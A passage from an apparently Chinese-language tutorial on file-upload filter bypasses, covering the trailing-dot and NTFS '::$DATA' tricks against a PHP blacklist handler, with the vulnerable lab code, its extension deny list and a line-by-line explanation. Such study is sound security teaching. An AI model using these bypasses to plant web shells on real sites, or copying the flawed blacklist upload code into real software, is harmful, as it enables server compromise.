    <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-9-利用-windows-系统特征绕过上传"><a href="#2-5-9-利用-windows-系统特征绕过上传" class="headerlink" title="2.5.9 利用 windows 系统特征绕过上传"></a>2.5.9 利用 windows 系统特征绕过上传</h2><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>抓包修改在&#x3D;&#x3D;后缀名后加上.&#x3D;&#x3D;即可绕过。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在 windows 中文件后缀名后的&#x3D;&#x3D;’.’&#x3D;&#x3D; 系统会自动忽略.所以 <strong>shell.php. 像 shell.php 的效果一样。</strong>所以可以在文件名后面加上.绕过。</p><h3 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h3><p>同样是黑名单禁止上传，但是可以上传.php.这种文件后缀。<br>没有删除文件末尾的点的函数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">```php</span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">``````</span><br></pre></td></tr></table></figure><h2 id="2-5-10-NTFS-交换数据流-DATA-绕过上传"><a href="#2-5-10-NTFS-交换数据流-DATA-绕过上传" class="headerlink" title="2.5.10 NTFS 交换数据流$DATA 绕过上传"></a>2.5.10 NTFS 交换数据流$DATA 绕过上传</h2><p>NTFS 交换数据流::$DATA 绕过上传方法<br>burpsuite 抓包，修改后缀名为 php::$DATA</p><h3 id="NTFS-交换数据流-DATA-绕过上传原理"><a href="#NTFS-交换数据流-DATA-绕过上传原理" class="headerlink" title="NTFS 交换数据流::$DATA 绕过上传原理"></a>NTFS 交换数据流::$DATA 绕过上传原理</h3><p>如果后缀名没有对::$DATA 进行判断，利用 windows 系统 NTFS 特征可以绕过上传。</p><h3 id="NTFS-交换数据流-DATA-绕过上传代码分析"><a href="#NTFS-交换数据流-DATA-绕过上传代码分析" class="headerlink" title="NTFS 交换数据流::$DATA 绕过上传代码分析"></a>NTFS 交换数据流::$DATA 绕过上传代码分析</h3><p>$deny_ext&#x3D;array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.</p><p>jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.</p><p>ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”.aShx”,”.aSmx”,”.cEr”,”.</p><p>sWf”,”.swf”,”.htaccess”);</p><p>同样用黑名单过滤后缀名。但是程序中没有对::$DATA 进行过滤可以添加::$DATA 绕过上传</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段PHP代码是一个文件上传处理脚本，主要用于接收用户上传的文件，并根据文件扩展名进行安全性检查。如果文件扩展名不在禁止列表中，则将文件移动到指定的上传目录。以下是代码的详细解释，包括语法和逻辑。</p><h3 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// 初始化上传状态为false</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// 初始化错误消息为空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123; <span class="comment">// 检查是否提交了表单</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123; <span class="comment">// 检查上传目录是否存在</span></span><br><span class="line">        <span class="comment">// 定义禁止上传的文件扩展名</span></span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// 获取文件名并去除首尾空格</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 删除文件名末尾的点（假设deldot是自定义函数）</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">// 获取文件扩展名</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 去除扩展名首尾的空格</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123; <span class="comment">// 检查扩展名是否在禁止列表中</span></span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// 获取临时文件路径</span></span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>; <span class="comment">// 生成目标文件路径</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; <span class="comment">// 将临时文件移动到目标路径</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// 设置上传状态为true</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>; <span class="comment">// 设置错误消息</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>; <span class="comment">// 文件扩展名在禁止列表中，设置错误消息</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>; <span class="comment">// 上传目录不存在，设置错误消息</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="代码详细解释-2"><a href="#代码详细解释-2" class="headerlink" title="代码详细解释"></a>代码详细解释</h3><h4 id="1-初始化变量-2"><a href="#1-初始化变量-2" class="headerlink" title="1. 初始化变量"></a>1. 初始化变量</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// 初始化上传状态为false</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// 初始化错误消息为空</span></span><br></pre></td></tr></table></figure><ul><li><code>$is_upload</code>：布尔变量，用于标记文件是否上传成功。</li><li><code>$msg</code>：字符串变量，用于存储错误消息或提示信息。</li></ul><h4 id="2-检查表单是否提交-2"><a href="#2-检查表单是否提交-2" class="headerlink" title="2. 检查表单是否提交"></a>2. 检查表单是否提交</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>$_POST[&#39;submit&#39;]</code>：检查表单是否通过POST方法提交。<code>submit</code>是表单中提交按钮的名称。</li><li><code>isset()</code>：检查变量是否已设置且不为<code>null</code>。如果表单提交按钮被点击，<code>$_POST[&#39;submit&#39;]</code>会被设置。</li></ul><h4 id="3-检查上传目录是否存在-2"><a href="#3-检查上传目录是否存在-2" class="headerlink" title="3. 检查上传目录是否存在"></a>3. 检查上传目录是否存在</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>UPLOAD_PATH</code>：常量，表示文件上传的目标目录路径。</li><li><code>file_exists()</code>：检查指定路径的文件或目录是否存在。如果上传目录不存在，脚本会进入<code>else</code>分支。</li></ul><h4 id="4-定义禁止上传的文件扩展名-1"><a href="#4-定义禁止上传的文件扩展名-1" class="headerlink" title="4. 定义禁止上传的文件扩展名"></a>4. 定义禁止上传的文件扩展名</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>定义一个数组，包含所有禁止上传的文件扩展名。这些扩展名通常对应于可执行脚本或可能被用于恶意目的的文件类型。</li></ul><h4 id="5-获取并处理上传文件的文件名-1"><a href="#5-获取并处理上传文件的文件名-1" class="headerlink" title="5. 获取并处理上传文件的文件名"></a>5. 获取并处理上传文件的文件名</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// 获取文件名并去除首尾空格</span></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// 删除文件名末尾的点（假设deldot是自定义函数）</span></span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>：获取用户上传文件的原始文件名。</li><li><code>trim()</code>：去除字符串首尾的空格。</li><li><code>deldot()</code>：自定义函数，用于删除文件名末尾的点（<code>.</code>）。可能是为了防止类似<code>test.php.</code>的文件名绕过扩展名检查。</li></ul><h4 id="6-提取文件扩展名-1"><a href="#6-提取文件扩展名-1" class="headerlink" title="6. 提取文件扩展名"></a>6. 提取文件扩展名</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">// 获取文件扩展名</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// 转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// 去除扩展名首尾的空格</span></span><br></pre></td></tr></table></figure><ul><li><code>strrchr($file_name, &#39;.&#39;)</code>：从文件名中提取最后一个<code>.</code>及其后面的内容，即文件扩展名。</li><li><code>strtolower()</code>：将扩展名转换为小写，确保后续比较不受大小写影响。</li><li><code>trim()</code>：去除扩展名首尾的空格。</li></ul><h4 id="7-检查文件扩展名是否在禁止列表中-1"><a href="#7-检查文件扩展名是否在禁止列表中-1" class="headerlink" title="7. 检查文件扩展名是否在禁止列表中"></a>7. 检查文件扩展名是否在禁止列表中</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>in_array($file_ext, $deny_ext)</code>：检查文件扩展名是否在禁止列表<code>$deny_ext</code>中。</li><li>如果扩展名不在禁止列表中，继续后续操作；否则，设置错误消息并终止处理。</li></ul><h4 id="8-生成目标文件路径-1"><a href="#8-生成目标文件路径-1" class="headerlink" title="8. 生成目标文件路径"></a>8. 生成目标文件路径</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// 获取临时文件路径</span></span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>; <span class="comment">// 生成目标文件路径</span></span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>：获取上传文件的临时存储路径。</li><li><code>UPLOAD_PATH</code>：目标上传目录。</li><li><code>date(&quot;YmdHis&quot;)</code>：生成当前时间戳，格式为<code>YYYYMMDDHHMMSS</code>。</li><li><code>rand(1000,9999)</code>：生成一个随机数，范围为1000到9999。</li><li><code>$img_path</code>：拼接生成最终的目标文件路径，格式为<code>UPLOAD_PATH/YYYYMMDDHHMMSS随机数.扩展名</code>。</li></ul><h4 id="9-移动上传文件-1"><a href="#9-移动上传文件-1" class="headerlink" title="9. 移动上传文件"></a>9. 移动上传文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// 设置上传状态为true</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>; <span class="comment">// 设置错误消息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>move_uploaded_file($temp_file, $img_path)</code>：将临时文件从<code>$temp_file</code>移动到目标路径<code>$img_path</code>。<ul><li>如果移动成功，设置<code>$is_upload</code>为<code>true</code>，表示上传成功。</li><li>如果移动失败，设置错误消息为“上传出错！”。</li></ul></li></ul><h4 id="10-文件扩展名在禁止列表中"><a href="#10-文件扩展名在禁止列表中" class="headerlink" title="10. 文件扩展名在禁止列表中"></a>10. 文件扩展名在禁止列表中</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span 